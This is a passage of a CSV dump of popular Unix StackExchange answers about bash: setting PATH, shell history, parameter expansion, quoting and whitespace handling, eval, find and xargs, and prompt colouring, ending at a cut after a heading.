Title,Id,Tags,Score,Body
"How to correctly add a path to PATH?","26047","<bash><environment-variables><path><bashrc>","1090","<h3>The simple stuff</h3>

<pre><code>PATH=$PATH:~/opt/bin
</code></pre>

<p>or</p>

<pre><code>PATH=~/opt/bin:$PATH
</code></pre>

<p>depending on whether you want to add <code>~/opt/bin</code> at the end (to be searched after all other directories, in case there is a program by the same name in multiple directories) or at the beginning (to be searched before all other directories).</p>

<p>You can add multiple entries at the same time. <code>PATH=$PATH:~/opt/bin:~/opt/node/bin</code> or variations on the ordering work just fine. Don't put <code>export</code> at the beginning of the line as it has additional complications (see below under “Notes on shells other than bash”).</p>

<p>If your <code>PATH</code> gets built by many different components, you might end up with duplicate entries. See <a href=""https://unix.stackexchange.com/questions/25605/how-to-add-home-directory-path-to-be-discovered-by-unix-which-command"">How to add home directory path to be discovered by Unix which command?</a> and <a href=""https://unix.stackexchange.com/questions/40749/remove-duplicate-path-entries-with-awk-command"">Remove duplicate $PATH entries with awk command</a> to avoid adding duplicates or remove them.</p>

<p>Some distributions automatically put <code>~/bin</code> in your PATH if it exists, by the way.</p>

<h3>Where to put it</h3>

<p>Put the line to modify <code>PATH</code> in <code>~/.profile</code>, or in <code>~/.bash_profile</code> if that's what you have.</p>

<p>Note that <code>~/.bash_rc</code> is not read by any program, and <code>~/.bashrc</code> is the configuration file of interactive instances of bash. You should not define environment variables in <code>~/.bashrc</code>. The right place to define environment variables such as <code>PATH</code> is <code>~/.profile</code> (or <code>~/.bash_profile</code> if you don't care about shells other than bash). See <a href=""https://superuser.com/questions/183870/difference-between-bashrc-and-bash-profile/183980#183980"">What's the difference between them and which one should I use?</a></p>

<p>Don't put it in <code>/etc/environment</code> or <code>~/.pam_environment</code>: these are not shell files, you can't use substitutions like <code>$PATH</code> in there. In these files, you can only override a variable, not add to it.</p>

<h3>Potential complications in some system scripts</h3>

<p>You don't need <code>export</code> if the variable is already in the environment: any change of the value of the variable is reflected in the environment.¹ <code>PATH</code> is pretty much always in the environment; all unix systems set it very early on (usually in the very first process, in fact).</p>

<p>At login time, you can rely on <code>PATH</code> being already in the environment, and already containing some system directories. If you're writing a script that may be executed early while setting up some kind of virtual environment, you may need to ensure that <code>PATH</code> is non-empty and exported: if <code>PATH</code> is still unset, then something like <code>PATH=$PATH:/some/directory</code> would set <code>PATH</code> to <code>:/some/directory</code>, and the empty component at the beginning means the current directory (like <code>.:/some/directory</code>).</p>

<pre><code>if [ -z ""${PATH-}"" ]; then export PATH=/usr/local/bin:/usr/bin:/bin; fi
</code></pre>

<h3>Notes on shells other than bash</h3>

<p>In bash, ksh and zsh, <code>export</code> is special syntax, and both <code>PATH=~/opt/bin:$PATH</code> and <code>export PATH=~/opt/bin:$PATH</code> do the right thing even. In other Bourne/POSIX-style shells such as dash (which is <code>/bin/sh</code> on many systems), <code>export</code> is parsed as an ordinary command, which implies two differences:</p>

<ul>
<li><code>~</code> is only parsed at the beginning of a word, except in assignments (see <a href=""https://unix.stackexchange.com/questions/25605/how-to-add-home-directory-path-to-be-discovered-by-unix-which-command/25704#25704"">How to add home directory path to be discovered by Unix which command?</a> for details);</li>
<li><code>$PATH</code> outside double quotes <a href=""https://unix.stackexchange.com/questions/131766/why-does-my-shell-script-choke-on-whitespace-or-other-special-characters"">breaks if <code>PATH</code> contains whitespace or <code>\[*?</code></a>.</li>
</ul>

<p>So in shells like dash, <strike><code>export PATH=~/opt/bin:$PATH</code></strike> sets <code>PATH</code> to the literal string <code>~/opt/bin/:</code> followed by the value of <code>PATH</code> up to the first space.
<code>PATH=~/opt/bin:$PATH</code> (a bare assignment) <a href=""https://unix.stackexchange.com/questions/68694/when-is-double-quoting-necessary/68748#68748"">doesn't require quotes</a> and does the right thing. If you want to use <code>export</code> in a portable script, you need to write <code>export PATH=""$HOME/opt/bin:$PATH""</code>, or <code>PATH=~/opt/bin:$PATH; export PATH</code> (or <code>PATH=$HOME/opt/bin:$PATH; export PATH</code> for portability to even the Bourne shell that didn't accept <code>export var=value</code> and didn't do tilde expansion).</p>

<p>¹ <sub> This wasn't true in Bourne shells (as in the actual Bourne shell, not modern POSIX-style shells), but you're highly unlikely to encounter such old shells these days. </sub>  </p>
"
"Preserve bash history in multiple terminal windows","1288","<bash><command-history>","604","<p>Add the following to your <code>~/.bashrc</code>:</p>
<pre class=""lang-sh prettyprint-override""><code># Avoid duplicates
HISTCONTROL=ignoredups:erasedups
# When the shell exits, append to the history file instead of overwriting it
shopt -s histappend

# After each command, append to the history file and reread it
PROMPT_COMMAND=&quot;${PROMPT_COMMAND:+$PROMPT_COMMAND$'\n'}history -a; history -c; history -r&quot;
</code></pre>
"
"How to cycle through reverse-i-search in BASH?","73498","<bash>","580","<p>If I understand the question correctly you should be able to cycle through
alternatives by repeatedly hitting <kbd>Ctrl+R</kbd>.</p>

<p>E.g.:</p>

<p><kbd>Ctrl+R</kbd>
<code>grep</code>
<kbd>Ctrl+R</kbd>
<kbd>Ctrl+R</kbd>
...</p>

<p>That searches backwards through your history.  To search forward instead, use <kbd>Ctrl+S</kbd>, but you may need to have set: <code>stty -ixon</code> (either by <code>.bash_profile</code> or manually) prior to that to disable the XON/XOFF feature which takes over <kbd>Ctrl+s</kbd>.  (More details <a href=""https://stackoverflow.com/a/791800/162094"">here</a>.)</p>
"
"Using ""${a:-b}"" for variable assignment in scripts","122845","<bash><shell-script><scripting><variable>","565","<p>This technique allows for a variable to be assigned a value if another variable is either empty or is undefined. <strong>NOTE:</strong> This ""other variable"" can be the same or another variable.</p>

<p><em>excerpt</em></p>

<pre><code>${parameter:-word}
    If parameter is unset or null, the expansion of word is substituted. 
    Otherwise, the value of parameter is substituted.
</code></pre>

<p><strong>NOTE:</strong> This form also works, <code>${parameter-word}</code>. If you'd like to see a full list of all forms of parameter expansion available within Bash then I highly suggest you take a look at this topic in the Bash Hacker's wiki titled: ""<a href=""http://wiki.bash-hackers.org/syntax/pe"" rel=""noreferrer"">Parameter expansion</a>"".</p>

<h3>Examples</h3>

<em>variable doesn't exist</em>

<pre><code>$ echo ""$VAR1""

$ VAR1=""${VAR1:-default value}""
$ echo ""$VAR1""
default value
</code></pre>

<em>variable exists</em>

<pre><code>$ VAR1=""has value""
$ echo ""$VAR1""
has value

$ VAR1=""${VAR1:-default value}""
$ echo ""$VAR1""
has value
</code></pre>

<p>The same thing can be done by evaluating other variables, or running commands within the default value portion of the notation.</p>

<pre><code>$ VAR2=""has another value""
$ echo ""$VAR2""
has another value
$ echo ""$VAR1""

$

$ VAR1=""${VAR1:-$VAR2}""
$ echo ""$VAR1""
has another value
</code></pre>

<h3>More Examples</h3>

<p>You can also use a slightly different notation where it's just <code>VARX=${VARX-&lt;def. value&gt;}</code>.</p>

<pre><code>$ echo ""${VAR1-0}""
has another value
$ echo ""${VAR2-0}""
has another value
$ echo ""${VAR3-0}""
0
</code></pre>

<p>In the above <code>$VAR1</code> &amp; <code>$VAR2</code> were already defined with the string ""has another value"" but <code>$VAR3</code> was undefined, so the default value was used instead, <code>0</code>.</p>

<h3>Another Example</h3>

<pre><code>$ VARX=""${VAR3-0}""
$ echo ""$VARX""
0
</code></pre>

<h3>Checking and assigning using <code>:=</code> notation</h3>

<p>Lastly I'll mention the handy operator, <code>:=</code>. This will do a check and assign a value if the variable under test is empty or undefined.</p>

<h3>Example</h3>

<p>Notice that <code>$VAR1</code> is now set. The operator <code>:=</code> did the test and the assignment in a single operation.</p>

<pre><code>$ unset VAR1
$ echo ""$VAR1""

$ echo ""${VAR1:=default}""
default
$ echo ""$VAR1""
default
</code></pre>

<p>However if the value is set prior, then it's left alone.</p>

<pre><code>$ VAR1=""some value""
$ echo ""${VAR1:=default}""
some value
$ echo ""$VAR1""
some value
</code></pre>

<h3>Handy Dandy Reference Table</h3>

<p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=""https://i.stack.imgur.com/T2Fp8.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/T2Fp8.png"" alt=""ss of table""></a></p>

<h3>References</h3>

<ul>
<li><a href=""http://wiki.bash-hackers.org/syntax/pe"" rel=""noreferrer"">Parameter Expansions - Bash Hackers Wiki</a></li>
<li><a href=""http://www.tldp.org/LDP/abs/html/parameter-substitution.html"" rel=""noreferrer"">10.2. Parameter Substitution</a></li>
<li><a href=""http://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html"" rel=""noreferrer"">Bash Parameter Expansions</a></li>
</ul>
"
"How can I resolve a hostname to an IP address in a Bash script?","20784","<linux><bash><networking><dns>","480","<p>You can use <code>getent</code>, which comes with <code>glibc</code> (so you almost certainly have it on Linux). This resolves using gethostbyaddr/gethostbyname2, and so also will check <code>/etc/hosts</code>/NIS/etc:</p>

<pre><code>getent hosts unix.stackexchange.com | awk '{ print $1 }'
</code></pre>

<p>Or, as Heinzi said below, you can use <code>dig</code> with the <code>+short</code> argument (queries DNS servers directly, does not look at <code>/etc/hosts</code>/NSS/etc) :</p>

<pre><code>dig +short unix.stackexchange.com
</code></pre>

<p>If <code>dig +short</code> is unavailable, any one of the following should work. All of these query DNS directly and ignore other means of resolution:</p>

<pre><code>host unix.stackexchange.com | awk '/has address/ { print $4 }'
nslookup unix.stackexchange.com | awk '/^Address: / { print $2 }'
dig unix.stackexchange.com | awk '/^;; ANSWER SECTION:$/ { getline ; print $5 }'
</code></pre>

<p>If you want to only print one IP, then add the <code>exit</code> command to <code>awk</code>'s workflow.</p>

<pre><code>dig +short unix.stackexchange.com | awk '{ print ; exit }'
getent hosts unix.stackexchange.com | awk '{ print $1 ; exit }'
host unix.stackexchange.com | awk '/has address/ { print $4 ; exit }'
nslookup unix.stackexchange.com | awk '/^Address: / { print $2 ; exit }'
dig unix.stackexchange.com | awk '/^;; ANSWER SECTION:$/ { getline ; print $5 ; exit }'
</code></pre>
"
"How to get execution time of a script effectively?","52313","<bash><profiling>","467","<p>Just use <code>time</code> when you call the script:</p>

<pre><code>time yourscript.sh
</code></pre>
"
"In Bash, when to alias, when to script, and when to write a function?","30925","<bash><shell-script><alias><function>","387","<p>An alias should effectively not (in general) do more than change the default options of a command. It is nothing more than simple text replacement on the command name.  It can't do anything with arguments but pass them to the command it actually runs. So if you simply need to add an argument at the front of a single command, an alias will work.  Common examples are</p>

<pre><code># Make ls output in color by default.
alias ls=""ls --color=auto""
# make mv ask before overwriting a file by default
alias mv=""mv -i""
</code></pre>

<p>A function should be used when you need to do something more complex than an alias but that wouldn't be of use on its own.  For example, take <a href=""https://unix.stackexchange.com/a/25549/11750"">this answer</a> on a question I asked about changing <code>grep</code>'s default behavior depending on whether it's in a pipeline:</p>

<pre><code>grep() { 
    if [[ -t 1 ]]; then 
        command grep -n ""$@""
    else 
        command grep ""$@""
    fi
}
</code></pre>

<p>It's a perfect example of a function because it is too complex for an alias (requiring different defaults based on a condition), but it's not something you'll need in a non-interactive script.  </p>

<p>If you get too many functions or functions too big, put them into separate files in a hidden directory, and source them in your <code>~/.bashrc</code>:</p>

<pre><code>if [ -d ~/.bash_functions ]; then
    for file in ~/.bash_functions/*; do
        . ""$file""
    done
fi
</code></pre>

<p>A script should stand on its own. It should have value as something that can be re-used, or used for more than one purpose.</p>
"
"How do I loop through only directories in bash?","86722","<bash><files><directory>","342","<p>If you need to select more specific files than only directories use <code>find</code> and pass it to <code>while read</code>:</p>

<pre><code>shopt -s dotglob
find * -prune -type d | while IFS= read -r d; do 
    echo ""$d""
done
</code></pre>

<p>Use <code>shopt -u dotglob</code> to exclude hidden directories (or <code>setopt dotglob</code>/<code>unsetopt dotglob</code> in zsh).</p>

<p><code>IFS=</code> to avoid splitting filenames containing one of the <code>$IFS</code>, for example: <code>'a b'</code></p>

<p>see <a href=""https://unix.stackexchange.com/a/96912/20661"">AsymLabs answer</a> below for more <code>find</code> options</p>

<hr>

<p>edit:<br>
In case you need to create an exit value from within the while loop, you can circumvent the extra subshell by this trick:</p>

<pre><code>while IFS= read -r d; do 
    if [ ""$d"" == ""something"" ]; then exit 1; fi
done &lt; &lt;(find * -prune -type d)
</code></pre>
"
"Why does my shell script choke on whitespace or other special characters?","131766","<bash><shell><shell-script><quoting><whitespace>","322","<h2>Always use double quotes around variable substitutions and command substitutions: <code>""$foo""</code>, <code>""$(foo)""</code></h2>

<p>If you use <code>$foo</code> unquoted, your script will choke on input or parameters (or command output, with <code>$(foo)</code>) containing whitespace or <code>\[*?</code>.</p>

<p>There, you can stop reading. Well, ok, here are a few more:</p>

<ul>
<li><code>read</code> — <strong>To read input line by line with the <code>read</code> builtin, use <code>while IFS= read -r line; do …</code></strong><br>
Plain <code>read</code> treats backslashes and whitespace specially.</li>
<li><code>xargs</code> — <strong>Avoid <code>xargs</code></strong>. If you must use <code>xargs</code>, make that <code>xargs -0</code>. Instead of <code>find … | xargs</code>, <strong>prefer <code>find … -exec …</code></strong>.<br>
<code>xargs</code> treats whitespace and the characters <code>\""'</code> specially.</li>
</ul>

<p>This answer applies to Bourne/POSIX-style shells (<code>sh</code>, <code>ash</code>, <code>dash</code>, <code>bash</code>, <code>ksh</code>, <code>mksh</code>, <code>yash</code>…). Zsh users should skip it and read the end of <a href=""https://unix.stackexchange.com/questions/68694/when-is-double-quoting-necessary/68748#68748"">When is double-quoting necessary?</a> instead. If you want the whole nitty-gritty, <a href=""http://pubs.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html#tag_02_06"" rel=""noreferrer"">read the standard</a> or your shell's manual.</p>

<hr>

<p>Note that the explanations below contains a few approximations (statements that are true in most conditions but can be affected by the surrounding context or by configuration).</p>

<h2>Why do I need to write <code>""$foo""</code>? What happens without the quotes?</h2>

<p><code>$foo</code> does not mean “take the value of the variable <code>foo</code>”. It means something much more complex:</p>

<ul>
<li>First, take the value of the variable.</li>
<li>Field splitting: treat that value as a whitespace-separated list of fields, and build the resulting list. For example, if the variable contains <code>foo *  bar ​</code> then the result of this step is the 3-element list <code>foo</code>, <code>*</code>, <code>bar</code>.</li>
<li>Filename generation: treat each field as a glob, i.e. as a wildcard pattern, and replace it by the list of file names that match this pattern. If the pattern doesn't match any files, it is left unmodified. In our example, this results in the list containing <code>foo</code>, following by the list of files in the current directory, and finally <code>bar</code>. If the current directory is empty, the result is <code>foo</code>, <code>*</code>, <code>bar</code>.</li>
</ul>

<p>Note that the result is a list of strings. There are two contexts in shell syntax: list context and string context. Field splitting and filename generation only happen in list context, but that's most of the time. Double quotes delimit a string context: the whole double-quoted string is a single string, not to be split. (Exception: <code>""$@""</code> to expand to the list of positional parameters, e.g. <code>""$@""</code> is equivalent to <code>""$1"" ""$2"" ""$3""</code> if there are three positional parameters. See <a href=""https://unix.stackexchange.com/questions/41571/what-is-the-difference-between-and/94200#94200"">What is the difference between $* and $@?</a>)</p>

<p>The same happens to command substitution with <code>$(foo)</code> or with <code>`foo`</code>. On a side note, don't use <code>`foo`</code>: its quoting rules are weird and non-portable, and all modern shells support <code>$(foo)</code> which is absolutely equivalent except for having intuitive quoting rules.</p>

<p>The output of arithmetic substitution also undergoes the same expansions, but that isn't normally a concern as it only contains non-expandable characters (assuming <code>IFS</code> doesn't contain digits or <code>-</code>).</p>

<p>See <a href=""https://unix.stackexchange.com/questions/68694/when-is-double-quoting-necessary"">When is double-quoting necessary?</a> for more details about the cases when you can leave out the quotes.</p>

<p>Unless you mean for all this rigmarole to happen, just remember to always use double quotes around variable and command substitutions. Do take care: leaving out the quotes can lead not just to errors but to <a href=""https://unix.stackexchange.com/questions/171346/security-implications-of-forgetting-to-quote-a-variable-in-bash-posix-shells/171347#171347"">security holes</a>.</p>

<h3>How do I process a list of file names?</h3>

<p>If you write <code>myfiles=""file1 file2""</code>, with spaces to separate the files, this can't work with file names containing spaces. Unix file names can contain any character other than <code>/</code> (which is always a directory separator) and null bytes (which you can't use in shell scripts with most shells).</p>

<p>Same problem with <code>myfiles=*.txt; … process $myfiles</code>. When you do this, the variable <code>myfiles</code> contains the 5-character string <code>*.txt</code>, and it's when you write <code>$myfiles</code> that the wildcard is expanded. This example will actually work, until you change your script to be <code>myfiles=""$someprefix*.txt""; … process $myfiles</code>. If <code>someprefix</code> is set to <code>final report</code>, this won't work.</p>

<p>To process a list of any kind (such as file names), put it in an array. This requires mksh, ksh93, yash or bash (or zsh, which doesn't have all these quoting issues); a plain POSIX shell (such as ash or dash) doesn't have array variables.</p>

<pre><code>myfiles=(""$someprefix""*.txt)
process ""${myfiles[@]}""
</code></pre>

<p>Ksh88 has array variables with a different assignment syntax <code>set -A myfiles ""someprefix""*.txt</code> (see <a href=""https://stackoverflow.com/questions/22862038/assignation-variable-under-different-ksh-environment"">assignation variable under different ksh environment</a> if you need ksh88/bash portability). Bourne/POSIX-style shells have a single one array, the array of positional parameters <code>""$@""</code> which you set with <code>set</code> and which is local to a function:</p>

<pre><code>set -- ""$someprefix""*.txt
process -- ""$@""
</code></pre>

<h3>What about file names that begin with <code>-</code>?</h3>

<p>On a related note, keep in mind that file names can begin with a <code>-</code> (dash/minus), which most commands interpret as denoting an option. Some commands (like <code>sh</code>, <code>set</code> or <code>sort</code>) also accept options that start with <code>+</code>. If you have a file name that begins with a variable part, be sure to pass <code>--</code> before it, as in the snippet above. This indicates to the command that it has reached the end of options, so anything after that is a file name even if it starts with <code>-</code> or <code>+</code>.</p>

<p>Alternatively, you can make sure that your file names begin with a character other than <code>-</code>. Absolute file names begin with <code>/</code>, and you can add <code>./</code> at the beginning of relative names. The following snippet turns the content of the variable <code>f</code> into a “safe” way of referring to the same file that's guaranteed not to start with <code>-</code> nor <code>+</code>.</p>

<pre><code>case ""$f"" in -* | +*) ""f=./$f"";; esac
</code></pre>

<p>On a final note on this topic, beware that some commands interpret <code>-</code> as meaning standard input or standard output, even after <code>--</code>. If you need to refer to an actual file named <code>-</code>, or if you're calling such a program and you don't want it to read from stdin or write to stdout, make sure to rewrite <code>-</code> as above. See <a href=""https://unix.stackexchange.com/questions/110750/what-is-the-difference-between-du-sh-and-du-sh/110756#110756"">What is the difference between &quot;du -sh *&quot; and &quot;du -sh ./*&quot;?</a> for further discussion.</p>

<h2>How do I store a command in a variable?</h2>

<p>“Command” can mean three things: a command name (the name as an executable, with or without full path, or the name of a function, builtin or alias), a command name with arguments, or a piece of shell code. There are accordingly different ways of storing them in a variable.</p>

<p>If you have a command name, just store it and use the variable with double quotes as usual.</p>

<pre><code>command_path=""$1""
…
""$command_path"" --option --message=""hello world""
</code></pre>

<p>If you have a command with arguments, the problem is the same as with a list of file names above: this is a list of strings, not a string. You can't just stuff the arguments into a single string with spaces in between, because if you do that you can't tell the difference between spaces that are part of arguments and spaces that separate arguments. If your shell has arrays, you can use them.</p>

<pre><code>cmd=(/path/to/executable --option --message=""hello world"" --)
cmd=(""${cmd[@]}"" ""$file1"" ""$file2"")
""${cmd[@]}""
</code></pre>

<p>What if you're using a shell without arrays? You can still use the positional parameters, if you don't mind modifying them.</p>

<pre><code>set -- /path/to/executable --option --message=""hello world"" --
set -- ""$@"" ""$file1"" ""$file2""
""$@""
</code></pre>

<p>What if you need to store a complex shell command, e.g. with redirections, pipes, etc.? Or if you don't want to modify the positional parameters? Then you can build a string containing the command, and use the <code>eval</code> builtin.</p>

<pre><code>code='/path/to/executable --option --message=""hello world"" -- /path/to/file1 | grep ""interesting stuff""'
eval ""$code""
</code></pre>

<p>Note the nested quotes in the definition of <code>code</code>: the single quotes <code>'…'</code> delimit a string literal, so that the value of the variable <code>code</code> is the string <code>/path/to/executable --option --message=""hello world"" -- /path/to/file1</code>. The <code>eval</code> builtin tells the shell to parse the string passed as an argument as if it appeared in the script, so at that point the quotes and pipe are parsed, etc.</p>

<p>Using <code>eval</code> is tricky. Think carefully about what gets parsed when. In particular, you can't just stuff a file name into the code: you need to quote it, just like you would if it was in a source code file. There's no direct way to do that. Something like <code>code=""$code $filename""</code> breaks if the file name contains any shell special character (spaces, <code>$</code>, <code>;</code>, <code>|</code>, <code>&lt;</code>, <code>&gt;</code>, etc.). <code>code=""$code \""$filename\""""</code> still breaks on <code>""$\`</code>. Even <code>code=""$code '$filename'""</code> breaks if the file name contains a <code>'</code>. There are two solutions.</p>

<ul>
<li><p>Add a layer of quotes around the file name. The easiest way to do that is to add single quotes around it, and replace single quotes by <code>'\''</code>.</p>

<pre><code>quoted_filename=$(printf %s. ""$filename"" | sed ""s/'/'\\\\''/g"")
code=""$code '${quoted_filename%.}'""
</code></pre></li>
<li><p>Keep the variable expansion inside the code, so that it's looked up when the code is evaluated, not when the code fragment is built. This is simpler but only works if the variable is still around with the same value at the time the code is executed, not e.g. if the code is built in a loop.</p>

<pre><code>code=""$code \""\$filename\""""
</code></pre></li>
</ul>

<p>Finally, do you really need a variable containing code? The most natural way to give a name to a code block is to define a function.</p>

<h2>What's up with <code>read</code>?</h2>

<p>Without <code>-r</code>, <code>read</code> allows continuation lines — this is a single logical line of input:</p>

<pre><code>hello \
world
</code></pre>

<p><code>read</code> splits the input line into fields delimited by characters in <code>$IFS</code> (without <code>-r</code>, backslash also escapes those). For example, if the input is a line containing three words, then <code>read first second third</code> sets <code>first</code> to the first word of input, <code>second</code> to the second word and <code>third</code> to the third word. If there are more words, the last variable contains everything that's left after setting the preceding ones. Leading and trailing whitespace are trimmed.</p>

<p>Setting <code>IFS</code> to the empty string avoids any trimming. See <a href=""https://unix.stackexchange.com/questions/18886/why-is-while-ifs-read-used-so-often-instead-of-ifs-while-read/18936#18936"">Why is `while IFS= read` used so often, instead of `IFS=; while read..`?</a> for a longer explanation.</p>

<h2>What's wrong with <code>xargs</code>?</h2>

<p>The input format of <code>xargs</code> is whitespace-separated strings which can optionally be single- or double-quoted. No standard tool outputs this format.</p>

<p>The input to <code>xargs -L1</code> or <code>xargs -l</code> is almost a list of lines, but not quite — if there is a space at the end of a line, the following line is a continuation line.</p>

<p>You can use <code>xargs -0</code> where applicable (and where available: GNU (Linux, Cygwin), BusyBox, BSD, OSX, but it isn't in POSIX). That's safe, because null bytes can't appear in most data, in particular in file names. To produce a null-separated list of file names, use <code>find … -print0</code> (or you can use <code>find … -exec …</code> as explained below).</p>

<h3>How do I process files found by <code>find</code>?</h3>

<pre><code>find … -exec some_command a_parameter another_parameter {} +
</code></pre>

<p><code>some_command</code> needs to be an external command, it can't be a shell function or alias. If you need to invoke a shell to process the files, call <code>sh</code> explicitly.</p>

<pre><code>find … -exec sh -c '
  for x do
    … # process the file ""$x""
  done
' find-sh {} +
</code></pre>

<h2>I have some other question</h2>

<p>Browse the <a href=""/questions/tagged/quoting"" class=""post-tag"" title=""show questions tagged &#39;quoting&#39;"" rel=""tag"">quoting</a> tag on this site, or <a href=""/questions/tagged/shell"" class=""post-tag"" title=""show questions tagged &#39;shell&#39;"" rel=""tag"">shell</a> or <a href=""/questions/tagged/shell-script"" class=""post-tag"" title=""show questions tagged &#39;shell-script&#39;"" rel=""tag"">shell-script</a>. (Click on “learn more…” to see some general tips and a hand-selected list of common questions.) If you've searched and you can't find an answer, <a href=""https://unix.stackexchange.com/questions/ask"">ask away</a>.</p>
"
"How can I get the size of a file in a bash script?","16640","<bash><shell><files>","311","<p>Your best bet if on a GNU system:</p>

<pre><code>stat --printf=""%s"" file.any
</code></pre>

<p>From <a href=""https://linux.die.net/man/1/stat"" rel=""noreferrer"">man stat</a>:</p>

<blockquote>
  <p>%s total size, in bytes</p>
</blockquote>

<p>In a bash script : </p>

<pre><code>#!/bin/bash
FILENAME=/home/heiko/dummy/packages.txt
FILESIZE=$(stat -c%s ""$FILENAME"")
echo ""Size of $FILENAME = $FILESIZE bytes.""
</code></pre>

<p>NOTE: see <a href=""https://unix.stackexchange.com/a/185039/9071"">@chbrown's answer</a> for how to use stat in terminal on Mac OS X.</p>
"
"What does ""rc"" in .bashrc stand for?","3467","<bash><bashrc><history>","301","<p>As is often the case with obscure terms, the <a href=""http://www.catb.org/jargon/html/R/rc-file.html"">Jargon File</a> has an answer:</p>

<blockquote>
  <p>[Unix: from runcom files on the CTSS system 1962-63, via the startup script /etc/rc] Script file containing startup instructions for an application program (or an entire operating system), usually a text file containing commands of the sort that might have been invoked manually once the system was running but are to be executed automatically each time the system starts up.</p>
</blockquote>

<p>Thus, it would seem that the ""rc"" part stands for ""runcom"", which I believe can be expanded to ""run commands"".  In fact, this is exactly what the file contains, commands that bash should run.</p>
"
"How do I clear Bash's cache of paths to executables?","5609","<bash><executable><cache>","300","<p><code>bash</code> does cache the full path to a command.  You can verify that the command you are trying to execute is hashed with the <code>type</code> command:</p>

<pre><code>$ type svnsync
svnsync is hashed (/usr/local/bin/svnsync)
</code></pre>

<p>To clear the entire cache:</p>

<pre><code>$ hash -r
</code></pre>

<p>Or just one entry:</p>

<pre><code>$ hash -d svnsync
</code></pre>

<p>For additional information, consult <code>help hash</code> and <code>man bash</code>.</p>
"
"How to colorize output of git?","44266","<bash><colors><git>","294","<p>You can create a section <code>[color]</code> in your <code>~/.gitconfig</code> with e.g. the following content</p>

<pre><code>[color]
  diff = auto
  status = auto
  branch = auto
  interactive = auto
  ui = true
  pager = true
</code></pre>

<p>You can also fine control what you want to have coloured in what way, e.g.</p>

<pre><code>[color ""status""]
  added = green
  changed = red bold
  untracked = magenta bold

[color ""branch""]
  remote = yellow
</code></pre>

<p>I hope this gets you started. And of course, you need a terminal which supports colour.</p>
"
"How to get the pid of the last executed command in shell script?","30370","<bash><shell><process><background-process>","294","<p>The PID of the last executed command is in the <a href=""https://www.gnu.org/software/bash/manual/html_node/Special-Parameters.html#index-_0021-1"" rel=""noreferrer""><code>$!</code></a> shell variable:</p>

<pre><code>my-app &amp;
echo $!
</code></pre>
"
"How can I test if a variable is empty or contains only spaces?","146942","<bash><shell><shell-script><string>","278","<p>First, note that the <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Bash-Conditional-Expressions""><code>-z</code> test</a> is explicitly for:</p>

<blockquote>
  <p>the length of string is zero</p>
</blockquote>

<p>That is, a string containing only spaces should <strong>not</strong> be true under <code>-z</code>, because it has a non-zero length.</p>

<p>What you want is to remove the spaces from the variable using the <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Shell-Parameter-Expansion"">pattern replacement parameter expansion</a>:</p>

<pre><code>[[ -z ""${param// }"" ]]
</code></pre>

<p>This expands the <code>param</code> variable and replaces all matches of the pattern <code></code> (a single space) with nothing, so a string that has only spaces in it will be expanded to an empty string.</p>

<hr>

<p>The <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Shell-Parameter-Expansion"">nitty-gritty of how that works</a> is that <code>${var/pattern/string}</code> replaces the first longest match of <code>pattern</code> with <code>string</code>. When <code>pattern</code> starts with <code>/</code> (as above) then it replaces <em>all</em> the matches. Because the replacement is empty, we can omit the final <code>/</code> and the <code>string</code> value:</p>

<blockquote>
  <p>${parameter/pattern/string}</p>
  
  <p>The <em>pattern</em> is expanded to produce a pattern just as in filename expansion. <em>Parameter</em> is expanded and the longest match of <em>pattern</em> against its value is replaced with <em>string</em>. If <em>pattern</em> begins with ‘/’, all matches of <em>pattern</em> are replaced with <em>string</em>. Normally only the first match is replaced. ... If <em>string</em> is null, matches of <em>pattern</em> are deleted and the / following <em>pattern</em> may be omitted.</p>
</blockquote>

<p>After all that, we end up with <code>${param// }</code> to delete all spaces.</p>

<p><sub>Note that though present in <code>ksh</code> (where it originated), <code>zsh</code> and <code>bash</code>, that syntax is not POSIX and should not be used in <code>sh</code> scripts.</sub></p>
"
"How to define 'tab' delimiter with 'cut' in BASH?","35369","<bash><cut>","278","<p>Two ways:</p>
<p>Press <kbd>Ctrl</kbd>+<kbd>V</kbd> and then <kbd>Tab</kbd> to use &quot;verbatim&quot; <a href=""https://www.gnu.org/software/bash/manual/html_node/Commands-For-Text.html"" rel=""noreferrer"">quoted insert</a>.</p>
<pre><code>cut -f2 -d'   ' infile
</code></pre>
<p>or write it like this to use <a href=""https://www.gnu.org/software/bash/manual/html_node/ANSI_002dC-Quoting.html"" rel=""noreferrer"">ANSI-C quoting</a>:</p>
<pre><code>cut -f2 -d$'\t' infile
</code></pre>
"
"Colorizing your terminal and shell environment?","148","<shell><bash><colors><prompt>","270","<p>Here are a couple of things you can do:</p>

<p><strong>Editors + Code</strong><br>
A lot of editors have syntax highlighting support. <code>vim</code> and <code>emacs</code> have it on by default. You can also <a href=""https://askubuntu.com/questions/90013/how-do-i-enable-syntax-highlighting-in-nano"">enable it under <code>nano</code></a>.</p>

<p>You can also syntax highlight code on the terminal by using <a href=""http://pygments.org/faq/#how-can-i-use-pygments"" rel=""noreferrer"">Pygments</a> as a command-line tool.</p>

<p><strong>grep</strong><br>
<code>grep --color=auto</code> highlights all matches. You can also use <code>export GREP_OPTIONS='--color=auto'</code> to make it persistent without an alias. If you use <code>--color=always</code>, it'll <a href=""http://linuxcommando.blogspot.com/2007/10/grep-with-color-output.html"" rel=""noreferrer"">use colour even when piping</a>, which confuses things.</p>

<p><strong>ls</strong></p>

<p><code>ls --color=always</code></p>

<p>Colors specified by:</p>

<pre><code>export LS_COLORS='rs=0:di=01;34:ln=01;36:mh=00:pi=40;33'
</code></pre>

<p>(hint: <code>dircolors</code> can be helpful)</p>

<p><strong>PS1</strong><br>
You can set your PS1 (shell prompt) to use colours. For example:</p>

<pre><code>PS1='\e[33;1m\u@\h: \e[31m\W\e[0m\$ '
</code></pre>

<p>Will produce a PS1 like:</p>

<p>[yellow]lucas@ubuntu: [red]~[normal]$ </p>

<p>You can get really creative with this. As an idea:</p>

<pre><code>PS1='\e[s\e[0;0H\e[1;33m\h    \t\n\e[1;32mThis is my computer\e[u[\u@\h:  \w]\$ '
</code></pre>

<p>Puts a bar at the top of your terminal with some random info. (For best results, also use <code>alias clear=""echo -e '\e[2J\n\n'""</code>.)</p>

<p><strong>Getting Rid of Escape Sequences</strong></p>

